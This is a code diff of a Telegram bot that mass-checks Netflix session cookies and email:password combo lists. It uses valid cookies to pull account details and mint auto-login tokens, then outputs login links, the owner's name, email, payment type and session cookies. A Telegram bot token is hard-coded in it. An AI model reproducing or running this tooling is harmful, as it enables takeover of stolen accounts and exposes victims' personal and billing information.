+    lines.append("👤 ACCOUNT DETAILS")
+    lines.append(f"│ • Name         : {info.get('accountOwnerName','UNKNOWN')}")
+    lines.append(f"│ • Email        : {info.get('email','UNKNOWN')}")
+    lines.append(f"│ • Country      : {flag} {info.get('countryOfSignup','UNKNOWN')}")
+    lines.append(f"│ • Member Since : {format_member_since(info.get('memberSince'))}")
+    lines.append(f"│ • Status       : {info.get('membershipStatus','UNKNOWN')}")
+    lines.append(f"│ • Verified     : {verified_text}")
+    lines.append("")
+
+    lines.append("💳 SUBSCRIPTION")
+    lines.append(f"│ • Plan         : {info.get('localizedPlanName','UNKNOWN')}")
+    lines.append(f"│ • Quality      : {info.get('videoQuality','UNKNOWN')}")
+    lines.append(f"│ • Streams      : {streams_text}")
+    lines.append(f"│ • Billing      : {format_display_date(info.get('nextBillingDate'))}")
+    lines.append(f"│ • Payment      : {info.get('paymentMethodType','UNKNOWN')}")
+    lines.append("")
+
+    if profiles:
+        lines.append(f"👥 PROFILES ({len(profiles)})")
+        for i, p in enumerate(profiles):
+            lines.append(f"│ {i+1}. {p}")
+        lines.append("")
+
+    # ✅ FIXED LOGIN (INDENTED PROPERLY)
+    if token:
+        login_url = f"https://netflix.com/?nftoken={token}"
+
+        lines.append("🔐 LOGIN")
+        lines.append(f"│ • PC     : {login_url}")
+        lines.append(f"│ • Mobile : {login_url}")
+
+        if expiry:
+            try:
+                from datetime import datetime, timezone
+                dt = datetime.strptime(expiry, "%Y-%m-%d %H:%M:%S UTC")
+                dt = dt.replace(tzinfo=timezone.utc)
+
+                nice_exp = dt.strftime("%B %d, %Y at %I:%M %p UTC").replace(" 0", " ")
+
+                remaining = dt - datetime.now(timezone.utc)
+                if remaining.total_seconds() > 0:
+                    mins = int(remaining.total_seconds() // 60)
+                    nice_exp += f" ({mins} min left)"
+                else:
+                    nice_exp = "Expired"
+            except:
+                nice_exp = expiry
+
+            lines.append(f"│ • Expires: {nice_exp}")
+
+        lines.append("")
+
+    lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    lines.append("🍪 COOKIE")
+    lines.append("")
+
+    if netflix_id:
+        lines.append(f"NetflixId={netflix_id}")
+    else:
+        lines.append("No NetflixId found")
+
+    lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    lines.append("👑 Powered by @Edwxrdee")
+
+    return "\n".join(lines)
+
+def is_netflix_cookie_entry(domain, name):
+    return name in ALL_NETFLIX_COOKIE_NAMES or ("netflix." in str(domain).lower())
+
+def convert_json_to_netscape(json_data):
+    if isinstance(json_data, dict):
+        if isinstance(json_data.get("cookies"), list):
+            json_data = json_data["cookies"]
+        elif isinstance(json_data.get("items"), list):
+            json_data = json_data["items"]
+        else:
+            json_data = [json_data]
+    if not isinstance(json_data, list):
+        return ""
+    lines = []
+    for cookie in json_data:
+        if not isinstance(cookie, dict):
+            continue
+        domain = cookie.get("domain", "")
+        name = cookie.get("name", "")
+        if not is_netflix_cookie_entry(domain, name):
+            continue
+        tail = "TRUE" if domain.startswith(".") else "FALSE"
+        path = cookie.get("path", "/")
+        secure = "TRUE" if cookie.get("secure", False) else "FALSE"
+        expires = str(cookie.get("expirationDate", cookie.get("expiration", 0)))
+        value = cookie.get("value", "")
+        if name:
+            lines.append(f"{domain}\t{tail}\t{path}\t{secure}\t{expires}\t{name}\t{value}")
+    return "\n".join(lines)
+
+def is_netscape_cookie_line(line):
+    parts = line.strip().split("\t")
+    if len(parts) < 7:
+        return False
+    if parts[1].upper() not in ("TRUE", "FALSE"):
+        return False
+    if parts[3].upper() not in ("TRUE", "FALSE"):
+        return False
+    if not re.match(r"^-?\d+$", parts[4].strip()):
+        return False
+    return True
+
+def normalize_netscape_cookie_text(raw):
+    clean = []
+    for line in raw.splitlines():
+        if not is_netscape_cookie_line(line):
+            continue
+        parts = line.strip().split("\t")
+        if len(parts) >= 7:
+            domain = parts[0]
+            name = parts[5]
+            if is_netflix_cookie_entry(domain, name):
+                clean.append(line.strip())
+    return "\n".join(clean)
+
+def cookies_dict_from_netscape(netscape_text):
+    cookies = {}
+    for line in netscape_text.splitlines():
+        parts = line.strip().split("\t")
+        if len(parts) >= 7:
+            domain = parts[0]
+            name = parts[5]
+            value = parts[6]
+            if is_netflix_cookie_entry(domain, name):
+                cookies[name] = value
+    return cookies
+
+def extract_netflix_cookie_text(content):
+    # Try JSON
+    try:
+        data = json.loads(content)
+        json_ns = normalize_netscape_cookie_text(convert_json_to_netscape(data))
+        if json_ns:
+            return json_ns
+    except:
+        pass
+    # Try raw Netscape
+    ns = normalize_netscape_cookie_text(content)
+    if ns:
+        return ns
+    # Fallback: extract from header style
+    cookie_map = {}
+    for name in ALL_NETFLIX_COOKIE_NAMES:
+        m = re.search(rf"{re.escape(name)}=([^;\s]+)", content)
+        if m:
+            cookie_map[name] = m.group(1)
+    if not cookie_map:
+        return ""
+    lines = []
+    for name in REQUIRED_NETFLIX_COOKIES + OPTIONAL_NETFLIX_COOKIES:
+        val = cookie_map.get(name)
+        if val:
+            lines.append(f".netflix.com\tTRUE\t/\t{'TRUE' if name == 'SecureNetflixId' else 'FALSE'}\t0\t{name}\t{val}")
+    return "\n".join(lines)
+
+def get_account_page(session, proxy=None):
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "Accept-Encoding": "identity",
+    }
+    url = "https://www.netflix.com/account/membership"
+    resp = session.get(url, headers=headers, proxies=proxy, timeout=30)
+    if resp.status_code == 200 and resp.text:
+        primary = extract_info(resp.text)
+        fallback = None
+        try:
+            fb_resp = session.get("https://www.netflix.com/YourAccount", headers=headers, proxies=proxy, timeout=30)
+            if fb_resp.status_code == 200 and fb_resp.text:
+                fallback = extract_info(fb_resp.text)
+        except:
+            pass
+        return resp.text, resp.status_code, merge_info(primary, fallback)
+    return resp.text, resp.status_code, None
+
+def generate_unknown_guid():
+    return f"unknown{random.randint(10000000, 99999999)}"
+
+def create_nftoken(cookie_dict, attempts=1):
+    required = ("NetflixId", "SecureNetflixId", "nfvdid")
+    if any(not cookie_dict.get(c) for c in required):
+        return None, "Missing required cookies for NFToken"
+    headers = NFTOKEN_HEADERS.copy()
+    cookie_parts = []
+    for k, v in cookie_dict.items():
+        if k in ALL_NETFLIX_COOKIE_NAMES and v:
+            cookie_parts.append(f"{k}={v}")
+    headers["Cookie"] = "; ".join(cookie_parts)
+    last_err = "NFToken API error"
+    for _ in range(max(1, int(attempts))):
+        try:
+            r = requests.post(NFTOKEN_API_URL, headers=headers, json=NFTOKEN_PAYLOAD, timeout=30)
+            if r.status_code != 200:
+                if r.status_code == 403:
+                    last_err = "403"
+                elif r.status_code == 429:
+                    last_err = "429"
+                else:
+                    last_err = f"HTTP {r.status_code}"
+                continue
+            data = r.json()
+            token = (data.get("data") or {}).get("createAutoLoginToken")
+            if token:
+                return {"token": token, "expires_at_utc": get_nftoken_expiry_utc()}, None
+            last_err = "Token missing in response"
+        except requests.exceptions.Timeout:
+            last_err = "timeout"
+        except requests.exceptions.ProxyError:
+            last_err = "proxy error"
+        except Exception:
+            last_err = "NFToken API error"
+    return None, last_err
+
+def has_complete_account_info(info):
+    if not info:
+        return False
+    required = ("countryOfSignup", "membershipStatus", "localizedPlanName", "maxStreams", "videoQuality")
+    return all(info.get(f) and info.get(f) != "null" for f in required)
+
+# ----------------------------------------------------------------------
+#   Bot Implementation
+# ----------------------------------------------------------------------
 try:
     from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
     from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
     from telegram.constants import ParseMode
-    from telegram.error import TelegramError, RetryAfter, TimedOut
     TELEGRAM_AVAILABLE = True
 except ImportError:
     TELEGRAM_AVAILABLE = False
-    print("⚠️ Telegram modules not available. Run: pip install python-telegram-bot")
+    print("Telegram modules not available. Run: pip install python-telegram-bot")
 
-# ==================== CONFIGURATION ====================
-TOKEN = "8362625009:AAEkg8c7EZA3zRa9ixL0fb7iSo2-Ro0ZWE0"
-MAX_FILE_SIZE = 50 * 1024 * 1024  # 50MB limit
-MAX_THREADS = 10
-BOT_VERSION = "2.1.0"
-BOT_RELEASE_DATE = "2025-02-21"
-REQUEST_TIMEOUT = 30
-MAX_RETRIES = 3
-CACHE_SIZE = 1000
-ENABLE_ANALYTICS = True
-DEBUG_MODE = False
+BOT_TOKEN = "8362625009:AAEkg8c7EZA3zRa9ixL0fb7iSo2-Ro0ZWE0"           # <--- Replace with your token
+MAX_FILE_SIZE = 50 * 1024 * 1024            # 50 MB
+MAX_THREADS = 15
+BOT_VERSION = "1.0.0"
 
-# ==================== ENUMS ====================
-class SubscriptionTier(Enum):
-    UNKNOWN = "unknown"
-    BASIC = "basic"
-    STANDARD = "standard"
-    PREMIUM = "premium"
-    PREMIUM_4K = "premium_4k"
-    AD_SUPPORTED = "ad_supported"
-
-class AccountStatus(Enum):
-    ACTIVE = "active"
-    ON_HOLD = "on_hold"
-    SUSPENDED = "suspended"
-    CANCELLED = "cancelled"
-    TRIAL = "trial"
-    EXPIRED = "expired"
-
-class PaymentMethod(Enum):
-    CREDIT_CARD = "credit_card"
-    DEBIT_CARD = "debit_card"
-    PAYPAL = "paypal"
-    GIFT_CARD = "gift_card"
-    UNKNOWN = "unknown"
-
-class InputFormat(Enum):
-    NETSCAPE = "netscape"
-    JSON = "json"
-    HEADER = "header"
-    RAW = "raw"
-    EMAIL_PASS = "email_pass"
-    UNKNOWN = "unknown"
-
-# ==================== DATA CLASSES ====================
-@dataclass
-class AccountDetails:
-    """Comprehensive account information"""
-    # Basic Info
-    email: Optional[str] = None
-    profile_name: Optional[str] = None
-    country: Optional[str] = None
-    
-    # Subscription Details
-    subscription_tier: SubscriptionTier = SubscriptionTier.UNKNOWN
-    plan_type: Optional[str] = None
-    plan_price: Optional[str] = None
-    currency: Optional[str] = None
-    
-    # Dates
-    member_since: Optional[datetime] = None
-    next_billing: Optional[datetime] = None
-    trial_end: Optional[datetime] = None
-    
-    # Status
-    status: AccountStatus = AccountStatus.ACTIVE
-    is_active: bool = True
-    on_hold: bool = False
-    email_verified: bool = False
-    
-    # Profiles
-    profile_count: int = 0
-    profile_names: List[str] = field(default_factory=list)
-    primary_profile: Optional[str] = None
-    
-    # Payment
-    payment_method: Optional[str] = None
-    card_type: Optional[str] = None
-    card_last4: Optional[str] = None
-    card_expiry: Optional[str] = None
-    
-    # Contact
-    phone: Optional[str] = None
-    phone_verified: bool = False
-    alternate_email: Optional[str] = None
-    
-    # Features
-    has_extra_member: bool = False
-    extra_member_slots: int = 0
-    profiles_remaining: int = 0
-    download_allowed: bool = True
-    ultra_hd_allowed: bool = False
-    
-    # Streaming Limits
-    max_streams: int = 1
-    quality: str = "HD"
-    
-    # Security
-    two_factor_enabled: bool = False
-    last_login: Optional[datetime] = None
-    login_ip: Optional[str] = None
-    device_count: int = 0
-    
-    def to_dict(self) -> Dict[str, Any]:
-        """Convert to dictionary for serialization"""
-        data = asdict(self)
-        # Convert enums to strings
-        if isinstance(self.subscription_tier, Enum):
-            data['subscription_tier'] = self.subscription_tier.value
-        if isinstance(self.status, Enum):
-            data['status'] = self.status.value
-        # Convert datetime to string
-        for key in ['member_since', 'next_billing', 'trial_end', 'last_login']:
-            if data.get(key) and isinstance(data[key], datetime):
-                data[key] = data[key].isoformat()
-        return data
-
-@dataclass
-class CheckResult:
-    """Result of cookie/token check - ALL FIELDS HAVE DEFAULTS"""
-    success: bool = False
-    token: Optional[str] = None
-    account_details: Optional[AccountDetails] = None
-    error: Optional[str] = None
-    error_code: Optional[str] = None
-    source_file: Optional[str] = None
-    source_line: Optional[int] = None
-    cookies_used: Dict[str, str] = field(default_factory=dict)
-    processing_time: float = 0.0
-    format_type: str = "unknown"
-    timestamp: datetime = field(default_factory=datetime.now)
-    request_id: Optional[str] = None
-    retry_count: int = 0
-    cached: bool = False
-    
-    def to_dict(self) -> Dict[str, Any]:
-        """Convert to dictionary for serialization"""
-        data = asdict(self)
-        if self.account_details:
-            data['account_details'] = self.account_details.to_dict()
-        if isinstance(self.timestamp, datetime):
-            data['timestamp'] = self.timestamp.isoformat()
-        return data
-
-@dataclass
-class BatchResult:
-    """Results from batch processing"""
-    total: int = 0
-    success: int = 0
-    failed: int = 0
-    premium: int = 0
-    standard: int = 0
-    basic: int = 0
-    unknown: int = 0
-    total_time: float = 0.0
-    avg_time: float = 0.0
-    results: List[CheckResult] = field(default_factory=list)
-    start_time: datetime = field(default_factory=datetime.now)
-    end_time: Optional[datetime] = None
-    file_name: Optional[str] = None
-    
-    def calculate_stats(self):
-        """Calculate statistics after processing"""
-        self.end_time = datetime.now()
-        self.total = len(self.results)
-        self.success = sum(1 for r in self.results if r.success)
-        self.failed = self.total - self.success
-        
-        for r in self.results:
-            if r.account_details:
-                tier = r.account_details.subscription_tier
-                if tier == SubscriptionTier.PREMIUM or tier == SubscriptionTier.PREMIUM_4K:
-                    self.premium += 1
-                elif tier == SubscriptionTier.STANDARD:
-                    self.standard += 1
-                elif tier == SubscriptionTier.BASIC:
-                    self.basic += 1
-                else:
-                    self.unknown += 1
-        
-        if self.results:
-            self.avg_time = sum(r.processing_time for r in self.results) / len(self.results)
-
-# ==================== UTILITY CLASSES ====================
-class CountryFlagMapper:
-    """Map country codes to flag emojis and names"""
-    
-    _flag_cache: Dict[str, str] = {}
-    _name_cache: Dict[str, str] = {}
-    
-    @classmethod
-    def get_flag(cls, country_code: str) -> str:
-        """Convert ISO country code to flag emoji with caching"""
-        if not country_code or len(country_code) != 2:
-            return "🌍"
-        
-        # Check cache
-        if country_code in cls._flag_cache:
-            return cls._flag_cache[country_code]
-        
-        try:
-            # Regional indicator symbols (A-Z mapped to Unicode)
-            flag = chr(ord(country_code[0]) + 127397) + chr(ord(country_code[1]) + 127397)
-            cls._flag_cache[country_code] = flag
-            return flag
-        except:
-            return "🌍"
-    
-    @classmethod
-    def get_country_name(cls, country_code: str) -> str:
-        """Get full country name from code with caching"""
-        if not country_code or len(country_code) != 2:
-            return "Unknown"
-        
-        # Check cache
-        if country_code in cls._name_cache:
-            return cls._name_cache[country_code]
-        
-        if PYCOUNTRY_AVAILABLE:
-            try:
-                country = pycountry.countries.get(alpha_2=country_code.upper())
-                if country:
-                    name = country.name
-                    cls._name_cache[country_code] = name
-                    return name
-            except:
-                pass
-        
-        # Fallback mapping
-        common_names = {
-            'US': 'United States', 'GB': 'United Kingdom', 'IN': 'India',
-            'CA': 'Canada', 'AU': 'Australia', 'DE': 'Germany', 'FR': 'France',
-            'JP': 'Japan', 'BR': 'Brazil', 'MX': 'Mexico', 'ES': 'Spain',
-            'IT': 'Italy', 'NL': 'Netherlands', 'SE': 'Sweden', 'NO': 'Norway',
-            'DK': 'Denmark', 'FI': 'Finland', 'PL': 'Poland', 'TR': 'Turkey'
-        }
-        name = common_names.get(country_code.upper(), "Unknown")
-        cls._name_cache[country_code] = name
-        return name
-
-class TokenExpiryCalculator:
-    """Calculate token expiry and remaining time"""
-    
-    @staticmethod
-    def calculate_expiry(generated_time: Optional[datetime] = None, 
-                        validity_hours: int = 1) -> Dict[str, str]:
-        """
-        Calculate token expiry information
-        Netflix tokens typically expire in 1 hour
-        """
-        if generated_time is None:
-            now = datetime.now(UTC) if PYTZ_AVAILABLE else datetime.now()
-        else:
-            now = generated_time
-        
-        expires_time = now + timedelta(hours=validity_hours)
-        current_time = datetime.now(UTC) if PYTZ_AVAILABLE else datetime.now()
-        remaining = expires_time - current_time
-        
-        # Format remaining time
-        if remaining.total_seconds() <= 0:
-            remaining_str = "Expired"
-        else:
-            days = remaining.days
-            hours = remaining.seconds // 3600
-            minutes = (remaining.seconds // 60) % 60
-            seconds = remaining.seconds % 60
-            
-            parts = []
-            if days > 0:
-                parts.append(f"{days}d")
-            if hours > 0:
-                parts.append(f"{hours}h")
-            if minutes > 0:
-                parts.append(f"{minutes}m")
-            if seconds > 0 and not parts:  # Only show seconds if less than a minute
-                parts.append(f"{seconds}s")
-            
-            remaining_str = " ".join(parts) if parts else "Expiring soon"
-        
-        # Format timestamps
-        time_format = "%Y-%m-%d %H:%M:%S"
-        if PYTZ_AVAILABLE:
-            local_tz = pytz.timezone('Asia/Kolkata')  # Default to IST
-            generated_local = now.astimezone(local_tz)
-            expires_local = expires_time.astimezone(local_tz)
-            generated_str = generated_local.strftime(time_format)
-            expires_str = expires_local.strftime(time_format)
-        else:
-            generated_str = now.strftime(time_format)
-            expires_str = expires_time.strftime(time_format)
-        
-        return {
-            "generated": generated_str,
-            "expires": expires_str,
-            "remaining": remaining_str,
-            "expired": remaining.total_seconds() <= 0
-        }
-
-class RequestIDGenerator:
-    """Generate unique request IDs for tracking"""
-    
-    @staticmethod
-    def generate(prefix: str = "REQ") -> str:
-        """Generate a unique request ID"""
-        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
-        random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
-        return f"{prefix}-{timestamp}-{random_part}"
-
-class CacheManager:
-    """Simple in-memory cache with TTL"""
-    
-    def __init__(self, max_size: int = CACHE_SIZE, default_ttl: int = 3600):
-        self.cache: Dict[str, Tuple[Any, float]] = {}
-        self.max_size = max_size
-        self.default_ttl = default_ttl
-        self.lock = threading.RLock()
-    
-    def get(self, key: str) -> Optional[Any]:
-        """Get item from cache"""
-        with self.lock:
-            if key in self.cache:
-                value, expiry = self.cache[key]
-                if expiry > time.time():
-                    return value
-                else:
-                    del self.cache[key]
-            return None
-    
-    def set(self, key: str, value: Any, ttl: Optional[int] = None):
-        """Set item in cache with TTL"""
-        with self.lock:
-            # Evict if cache is full
-            if len(self.cache) >= self.max_size:
-                # Remove oldest item (simple FIFO)
-                oldest_key = next(iter(self.cache))
-                del self.cache[oldest_key]
-            
-            expiry = time.time() + (ttl or self.default_ttl)
-            self.cache[key] = (value, expiry)
-    
-    def clear(self):
-        """Clear all cache"""
-        with self.lock:
-            self.cache.clear()
-    
-    def remove(self, key: str):
-        """Remove specific key from cache"""
-        with self.lock:
-            if key in self.cache:
-                del self.cache[key]
-
-# ==================== STATISTICS TRACKING ====================
-class BotStats:
-    """Thread-safe statistics tracking"""
-    
-    def __init__(self):
-        self.lock = threading.RLock()
-        self.total_users: Set[int] = set()
-        self.total_checks: int = 0
-        self.successful_checks: int = 0
-        self.premium_accounts_found: int = 0
-        self.start_time: datetime = datetime.now()
-        self.daily_checks: Dict[str, int] = defaultdict(int)
-        self.format_usage: Dict[str, int] = defaultdict(int)
-        self.hourly_requests: List[int] = [0] * 24
-        self.errors: Dict[str, int] = defaultdict(int)
-        self.response_times: List[float] = []
-        self.daily_active_users: Set[int] = set()
-        self.total_files_processed: int = 0
-        self.total_batches: int = 0
-        
-        # Performance metrics
-        self.peak_concurrent: int = 0
-        self.current_concurrent: int = 0
-        self.total_processing_time: float = 0.0
-    
-    def add_user(self, user_id: int):
-        """Track a new user"""
-        with self.lock:
-            self.total_users.add(user_id)
-            self.daily_active_users.add(user_id)
-    
-    def record_check(self, success: bool, is_premium: bool = False, 
-                    format_type: str = "unknown", error_type: Optional[str] = None,
-                    processing_time: float = 0.0):
-        """Record a check result"""
-        with self.lock:
-            self.total_checks += 1
-            if success:
-                self.successful_checks += 1
-            if is_premium:
-                self.premium_accounts_found += 1
-            
-            # Daily stats
-            date_key = datetime.now().strftime("%Y-%m-%d")
-            self.daily_checks[date_key] += 1
-            
-            # Format usage
-            self.format_usage[format_type] += 1
-            
-            # Hourly stats
-            hour = datetime.now().hour
-            self.hourly_requests[hour] += 1
-            
-            # Errors
-            if error_type:
-                self.errors[error_type] += 1
-            
-            # Response times
-            if processing_time > 0:
-                self.response_times.append(processing_time)
-                # Keep only last 1000 response times
-                if len(self.response_times) > 1000:
-                    self.response_times = self.response_times[-1000:]
-            
-            self.total_processing_time += processing_time
-    
-    def record_file_processed(self):
-        """Record a file being processed"""
-        with self.lock:
-            self.total_files_processed += 1
-    
-    def record_batch(self, count: int):
-        """Record a batch process"""
-        with self.lock:
-            self.total_batches += 1
-    
-    def update_concurrent(self, delta: int):
-        """Update concurrent request count"""
-        with self.lock:
-            self.current_concurrent += delta
-            if self.current_concurrent > self.peak_concurrent:
-                self.peak_concurrent = self.current_concurrent
-    
-    def get_success_rate(self) -> float:
-        """Calculate success rate"""
-        if self.total_checks == 0:
-            return 0.0
-        return (self.successful_checks / self.total_checks) * 100
-    
-    def get_avg_response_time(self) -> float:
-        """Calculate average response time"""
-        if not self.response_times:
-            return 0.0
-        return sum(self.response_times) / len(self.response_times)
-    
-    def get_uptime(self) -> str:
-        """Get formatted uptime"""
-        uptime = datetime.now() - self.start_time
-        days = uptime.days
-        hours = uptime.seconds // 3600
-        minutes = (uptime.seconds // 60) % 60
-        seconds = uptime.seconds % 60
-        
-        parts = []
-        if days > 0:
-            parts.append(f"{days}d")
-        if hours > 0:
-            parts.append(f"{hours}h")
-        if minutes > 0:
-            parts.append(f"{minutes}m")
-        if seconds > 0 or not parts:
-            parts.append(f"{seconds}s")
-        
-        return " ".join(parts)
-    
-    def get_stats_summary(self) -> Dict[str, Any]:
-        """Get comprehensive stats summary"""
-        with self.lock:
-            now = datetime.now()
-            today = now.strftime("%Y-%m-%d")
-            
-            # Calculate active users today
-            active_today = len([uid for uid in self.daily_active_users 
-                               if uid in self.total_users])
-            
-            # Error breakdown
-            top_errors = dict(sorted(self.errors.items(), 
-                                     key=lambda x: x[1], reverse=True)[:5])
-            
-            # Format breakdown
-            format_breakdown = dict(sorted(self.format_usage.items(), 
-                                          key=lambda x: x[1], reverse=True))
-            
-            # Hourly distribution for today
-            hourly = {f"{i:02d}:00": self.hourly_requests[i] 
-                     for i in range(24) if self.hourly_requests[i] > 0}
-            
-            return {
-                "total_users": len(self.total_users),
-                "active_today": active_today,
-                "total_checks": self.total_checks,
-                "successful_checks": self.successful_checks,
-                "success_rate": self.get_success_rate(),
-                "premium_accounts": self.premium_accounts_found,
-                "uptime": self.get_uptime(),
-                "start_time": self.start_time.strftime("%Y-%m-%d %H:%M:%S"),
-                "checks_today": self.daily_checks.get(today, 0),
-                "format_breakdown": format_breakdown,
-                "error_breakdown": top_errors,
-                "avg_response_time": self.get_avg_response_time(),
-                "peak_concurrent": self.peak_concurrent,
-                "total_files": self.total_files_processed,
-                "total_batches": self.total_batches,
-                "total_processing_time": f"{self.total_processing_time:.2f}s",
-                "hourly_distribution": hourly,
-                "cache_hit_rate": "N/A"  # Would need cache stats
-            }
-
-# ==================== CORE PROCESSOR ====================
-class NetflixTokenGenerator:
-    def __init__(self):
-        self.session = self._create_session()
-        self.headers = self._get_default_headers()
-        self.api_url = 'https://android13.prod.ftl.netflix.com/graphql'
-        self.cache = CacheManager()
-        self.stats_lock = threading.RLock()
-        self.total_processed = 0
-        self.cache_hits = 0
-        self.cache_misses = 0
-
-    def _create_session(self) -> requests.Session:
-        session = requests.Session()
-        retry_strategy = requests.adapters.Retry(
-            total=MAX_RETRIES,
-            backoff_factor=1,
-            status_forcelist=[429, 500, 502, 503, 504],
-            allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE"]
-        )
-        adapter = requests.adapters.HTTPAdapter(
-            max_retries=retry_strategy,
-            pool_connections=100,
-            pool_maxsize=100
-        )
-        session.mount("http://", adapter)
-        session.mount("https://", adapter)
-        return session
-
-    def _get_default_headers(self) -> Dict[str, str]:
-        user_agents = [
-            'com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)',
-            'com.netflix.mediaclient/64032 (Linux; U; Android 14; Pixel 7; Build/UP1A.231105.001; Cronet/144.0.7465.0)',
-            'com.netflix.mediaclient/64150 (Linux; U; Android 14; SM-S918B; Build/UP1A.231105.001; Cronet/145.0.7482.0)',
-            'com.netflix.mediaclient/64280 (Linux; U; Android 14; iPhone15,3; Build/21A329; Cronet/146.0.7498.0)'
-        ]
-        return {
-            'User-Agent': random.choice(user_agents),
-            'Accept': 'multipart/mixed;deferSpec=20220824, application/graphql-response+json, application/json',
-            'Content-Type': 'application/json',
-            'Origin': 'https://www.netflix.com',
-            'Referer': 'https://www.netflix.com/',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Connection': 'keep-alive',
-            'Sec-Fetch-Dest': 'empty',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Site': 'same-site',
-            'Pragma': 'no-cache',
-            'Cache-Control': 'no-cache'
-        }
-
-    def _rotate_headers(self):
-        self.headers['User-Agent'] = self._get_default_headers()['User-Agent']
-
-    # ========== PARSING ENGINE (unchanged) ==========
-    def parse_netscape_cookie_line(self, line: str) -> Dict[str, str]:
-        parts = line.strip().split('\t')
-        if len(parts) >= 7:
-            name = parts[5]
-            value = parts[6]
-            return {name: value}
-        return {}
-
-    def parse_netscape_cookies(self, content: str) -> List[Dict[str, str]]:
-        cookies_list = []
-        current_cookie_set = {}
-        lines = content.split('\n')
-        line_number = 0
-        for line in lines:
-            line_number += 1
-            line = line.strip()
-            if not line or line.startswith('#'):
-                continue
-            cookie = self.parse_netscape_cookie_line(line)
-            if cookie:
-                current_cookie_set.update(cookie)
-                if 'NetflixId' in current_cookie_set and 'SecureNetflixId' in current_cookie_set:
-                    current_cookie_set['_source_line'] = line_number
-                    cookies_list.append(current_cookie_set.copy())
-                    current_cookie_set = {}
-        return cookies_list
-
-    def parse_header_string(self, text: str) -> Dict[str, str]:
-        cookies = {}
-        patterns = [
-            r'Cookie:\s*([^=]+=[^;]+(?:;\s*[^=]+=[^;]+)*)',
-            r'(NetflixId=[^;\s]+)',
-            r'(SecureNetflixId=[^;\s]+)',
-            r'(nfvdid=[^;\s]+)',
-            r'(OptanonConsent=[^;\s]+)'
-        ]
-        for pattern in patterns:
-            matches = re.findall(pattern, text, re.IGNORECASE)
-            for match in matches:
-                if '=' in match:
-                    if ';' in match:
-                        for cookie_part in match.split(';'):
-                            if '=' in cookie_part:
-                                key, value = cookie_part.split('=', 1)
-                                cookies[key.strip()] = value.strip()
-                    else:
-                        key, value = match.split('=', 1)
-                        cookies[key.strip()] = value.split(';')[0].strip()
-        return cookies
-
-    def parse_json_format(self, data: Any) -> List[Dict[str, str]]:
-        results = []
-        if isinstance(data, dict):
-            cookie_dict = {}
-            for key in ['NetflixId', 'SecureNetflixId', 'nfvdid', 'OptanonConsent', 'email', 'password']:
-                if key in data:
-                    cookie_dict[key] = str(data[key])
-            if 'NetflixId' in cookie_dict and 'SecureNetflixId' in cookie_dict:
-                results.append(cookie_dict)
-        elif isinstance(data, list):
-            for item in data:
-                if isinstance(item, dict):
-                    cookie_dict = {}
-                    for key in ['NetflixId', 'SecureNetflixId', 'nfvdid', 'OptanonConsent', 'email', 'password']:
-                        if key in item:
-                            cookie_dict[key] = str(item[key])
-                    if 'NetflixId' in cookie_dict and 'SecureNetflixId' in cookie_dict:
-                        results.append(cookie_dict)
-        return results
-
-    def parse_email_pass(self, line: str) -> Optional[Dict[str, str]]:
-        for separator in [':', '|', ';', ',']:
-            if separator in line and '@' in line:
-                parts = line.strip().split(separator, 1)
-                if len(parts) == 2:
-                    email = parts[0].strip()
-                    password = parts[1].strip()
-                    if re.match(r'[^@]+@[^@]+\.[^@]+', email):
-                        return {'email': email, 'password': password}
-        return None
-
-    def extract_all_formats(self, text: str) -> List[Dict[str, str]]:
-        results = []
-        seen_hashes = set()
-        # JSON
-        try:
-            data = json.loads(text)
-            json_results = self.parse_json_format(data)
-            if json_results:
-                for r in json_results:
-                    r['_format'] = 'json'
-                    cookie_hash = hashlib.md5(str(sorted(r.items())).encode()).hexdigest()
-                    if cookie_hash not in seen_hashes:
-                        seen_hashes.add(cookie_hash)
-                        results.append(r)
-        except:
-            pass
-        # Netscape
-        if not results and '\t' in text:
-            netscape_results = self.parse_netscape_cookies(text)
-            if netscape_results:
-                for r in netscape_results:
-                    r['_format'] = 'netscape'
-                    cookie_hash = hashlib.md5(str(sorted([(k,v) for k,v in r.items() if not k.startswith('_')])).encode()).hexdigest()
-                    if cookie_hash not in seen_hashes:
-                        seen_hashes.add(cookie_hash)
-                        results.append(r)
-        # Header
-        if not results:
-            header_cookies = self.parse_header_string(text)
-            if header_cookies.get('NetflixId') and header_cookies.get('SecureNetflixId'):
-                header_cookies['_format'] = 'header'
-                cookie_hash = hashlib.md5(str(sorted(header_cookies.items())).encode()).hexdigest()
-                if cookie_hash not in seen_hashes:
-                    seen_hashes.add(cookie_hash)
-                    results.append(header_cookies)
-        # Email:pass
-        if not results and ':' in text and '@' in text:
-            for line in text.split('\n'):
-                email_pass = self.parse_email_pass(line)
-                if email_pass:
-                    email_pass['_format'] = 'email_pass'
-                    email_pass['_needs_login'] = True
-                    cookie_hash = hashlib.md5(str(sorted(email_pass.items())).encode()).hexdigest()
-                    if cookie_hash not in seen_hashes:
-                        seen_hashes.add(cookie_hash)
-                        results.append(email_pass)
-        # Raw
-        if not results:
-            raw_cookies = {}
-            patterns = [
-                r'(NetflixId=[^;\s]+)',
-                r'(SecureNetflixId=[^;\s]+)',
-                r'(nfvdid=[^;\s]+)',
-                r'(OptanonConsent=[^;\s]+)'
-            ]
-            for pattern in patterns:
-                matches = re.findall(pattern, text)
-                for match in matches:
-                    if '=' in match:
-                        key, value = match.split('=', 1)
-                        raw_cookies[key] = value
-            if raw_cookies.get('NetflixId') and raw_cookies.get('SecureNetflixId'):
-                raw_cookies['_format'] = 'raw'
-                cookie_hash = hashlib.md5(str(sorted(raw_cookies.items())).encode()).hexdigest()
-                if cookie_hash not in seen_hashes:
